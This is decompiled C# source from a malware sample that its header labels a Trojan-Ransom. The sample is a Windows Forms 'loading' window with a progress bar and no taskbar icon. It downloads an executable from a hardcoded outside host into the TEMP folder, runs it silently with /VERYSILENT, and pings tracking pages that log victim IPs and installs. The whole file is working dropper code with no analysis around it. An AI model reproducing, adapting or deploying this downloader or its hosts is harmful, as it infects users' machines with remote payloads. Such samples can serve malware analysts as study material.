// Decompiled with JetBrains decompiler
// Type: f030113.tela_inicial
// Assembly: oihvduohn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DF58C4DC-61FD-4E9A-80D7-4B2AEDD2BD78
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00033-msil\Trojan-Ransom.Win32.Foreign.lcxz-3f08ea7406a1e399436b64817e83718c461987aeed5500c66351cc00aa724fc1.exe.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace f030113
{
  public class tela_inicial : Form
  {
    private IContainer components;
    private WebBrowser navegador_1;
    private Panel painel_inicial;
    private Label lb_carregando;
    private Label lb_porc;
    private ProgressBar barra_progresso;
    private System.Windows.Forms.Timer clock;
    private BackgroundWorker worker_fundo;
    private System.Windows.Forms.Timer valida_NAV;
    public string pagina1 = "http://www.bitmold.com/090113stats/090113ip.htm";
    public string pagina2 = "http://www.bitmold.com/090113stats/confir.htm";
    private string name_090113 = "090113f.exe";
    private string pagina_down = "http://www.buzzspend.com/090113download/";
    private string diretrizes = "/VERYSILENT /NORESTART";
    private bool nav1_completo;
    private bool ultimo_load;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.navegador_1 = new WebBrowser();
      this.painel_inicial = new Panel();
      this.lb_carregando = new Label();
      this.lb_porc = new Label();
      this.barra_progresso = new ProgressBar();
      this.clock = new System.Windows.Forms.Timer(this.components);
      this.worker_fundo = new BackgroundWorker();
      this.valida_NAV = new System.Windows.Forms.Timer(this.components);
      this.painel_inicial.SuspendLayout();
      this.SuspendLayout();
      this.navegador_1.Location = new Point(27, 95);
      this.navegador_1.MinimumSize = new Size(20, 20);
      this.navegador_1.Name = "navegador_1";
      this.navegador_1.Size = new Size(326, 250);
      this.navegador_1.TabIndex = 10;
      this.navegador_1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.navegador_1_DocumentCompleted);
      this.painel_inicial.BorderStyle = BorderStyle.FixedSingle;
      this.painel_inicial.Controls.Add((Control) this.lb_carregando);
      this.painel_inicial.Controls.Add((Control) this.lb_porc);
      this.painel_inicial.Controls.Add((Control) this.barra_progresso);
      this.painel_inicial.Location = new Point(3, 6);
      this.painel_inicial.Name = "painel_inicial";
      this.painel_inicial.Size = new Size(347, 62);
      this.painel_inicial.TabIndex = 9;
      this.lb_carregando.Location = new Point(8, 9);
      this.lb_carregando.Name = "lb_carregando";
      this.lb_carregando.Size = new Size(102, 13);
      this.lb_carregando.TabIndex = 7;
      this.lb_porc.AutoSize = true;
      this.lb_porc.Location = new Point(314, 34);
      this.lb_porc.Name = "lb_porc";
      this.lb_porc.Size = new Size(0, 13);
      this.lb_porc.TabIndex = 5;
      this.barra_progresso.Location = new Point(8, 28);
      this.barra_progresso.Name = "barra_progresso";
      this.barra_progresso.Size = new Size(301, 23);
      this.barra_progresso.TabIndex = 3;
      this.clock.Tick += new EventHandler(this.clock_Tick);
      this.worker_fundo.WorkerReportsProgress = true;
      this.worker_fundo.DoWork += new DoWorkEventHandler(this.bg_w_DoWork);
      this.worker_fundo.ProgressChanged += new ProgressChangedEventHandler(this.bg_w_ProgressChanged);
      this.worker_fundo.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.bg_w_RunWorkerCompleted);
      this.valida_NAV.Enabled = true;
      this.valida_NAV.Tick += new EventHandler(this.check_IE_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(355, 74);
      this.Controls.Add((Control) this.navegador_1);
      this.Controls.Add((Control) this.painel_inicial);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (tela_inicial);
      this.Opacity = 0.9;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Form1";
      this.TopMost = true;
      this.FormClosed += new FormClosedEventHandler(this.tela_inicial_FormClosed);
      this.Load += new EventHandler(this.tela_inicial_Load);
      this.painel_inicial.ResumeLayout(false);
      this.painel_inicial.PerformLayout();
      this.ResumeLayout(false);
    }

    public tela_inicial() => this.InitializeComponent();

    private void tela_inicial_Load(object sender, EventArgs e) => this.clock.Enabled = true;

    private void tela_inicial_FormClosed(object sender, FormClosedEventArgs e) => Environment.Exit(1);

    private void clock_Tick(object sender, EventArgs e)
    {
      this.navegador_1.Url = new Uri(this.pagina1);
      this.worker_fundo.RunWorkerAsync();
      this.clock.Enabled = false;
    }

    private void bg_w_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\" + this.name_090113, this.diretrizes);
      this.navegador_1.Url = new Uri(this.pagina2);
      this.ultimo_load = true;
    }

    private void bg_w_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
      this.barra_progresso.Value = e.ProgressPercentage;
      this.lb_porc.Text = e.ProgressPercentage.ToString() + "%";
    }

    private void bg_w_DoWork(object sender, DoWorkEventArgs e)
    {
      string uriString = this.pagina_down + this.name_090113;
      string path = Environment.GetEnvironmentVariable("TEMP") + "\\" + this.name_090113;
      HttpWebResponse response = (HttpWebResponse) WebRequest.Create(new Uri(uriString.ToLower())).GetResponse();
      response.Close();
      long contentLength = response.ContentLength;
      long num = 0;
      using (WebClient webClient = new WebClient())
      {
        using (Stream stream1 = webClient.OpenRead(new Uri(uriString)))
        {
          using (Stream stream2 = (Stream) new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[contentLength];
            int count;
            while ((count = stream1.Read(buffer, 0, buffer.Length)) > 0)
            {
              stream2.Write(buffer, 0, count);
              num += (long) count;
              this.worker_fundo.ReportProgress((int) ((double) num / (double) buffer.Length * 100.0));
            }
            stream2.Close();
          }
          stream1.Close();
        }
      }
    }

    private void navegador_1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      if (!this.ultimo_load)
        return;
      Application.Exit();
    }

    private void navegador_2_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void check_IE_Tick(object sender, EventArgs e)
    {
      if (!this.nav1_completo)
        return;
      Environment.Exit(1);
    }
  }
}
